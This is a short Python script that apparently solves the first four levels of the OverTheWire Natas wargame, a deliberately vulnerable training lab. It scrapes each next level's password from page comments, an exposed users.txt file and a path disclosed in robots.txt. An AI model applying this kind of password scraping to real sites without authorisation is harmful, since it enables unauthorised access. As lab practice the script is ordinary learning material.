#!/usr/bin/env python3

import requests
import re

numbers = 0
password0 = "natas0"

def natas0(username,password):
    req = requests.get(url,auth=(username,password))
    res = req.text
    password1 = re.findall(" is (.*) -->",res)[0]
    return password1

def natas1(username,password):
    req = requests.get(url,auth=(username,password))
    res = req.text
    password2 = re.findall(" is (.*) -->",res)[0]
    return password2

def natas2(username,password):
    req = requests.get(url+"files/users.txt",auth=(username,password))
    res = req.text
    password3 = re.findall("natas3:(.*)",res)[0]
    return password3

def natas3(username,password):
    req = requests.get(url+"robots.txt",auth=(username,password))
    res = req.text
    url1 = re.findall("Disallow: /(.*)/",res)[0]
#    print(url1)
    req1 = requests.get(url+url1+"/users.txt",auth=(username,password))
    res1 = req1.text
    password4 = re.findall("natas4:(.*)",res1)[0]
    return password4

while numbers <= 3:
    url = "http://natas" + str(numbers) + ".natas.labs.overthewire.org/"
    username = "natas" + str(numbers)
    password1 = natas0(username, password0)
    numbers += 1
    url = "http://natas" + str(numbers) + ".natas.labs.overthewire.org/"
    username = "natas" + str(numbers)
    password2 = natas1(username, password1)
    numbers += 1
    url = "http://natas" + str(numbers) + ".natas.labs.overthewire.org/"
    username = "natas" + str(numbers)
    password3 = natas2(username, password2)
    numbers += 1
    url = "http://natas" + str(numbers) + ".natas.labs.overthewire.org/"
    username = "natas" + str(numbers)
    password4 = natas3(username, password3)
    if password4 is not None:
        print(f"natas4:{password4}")
        break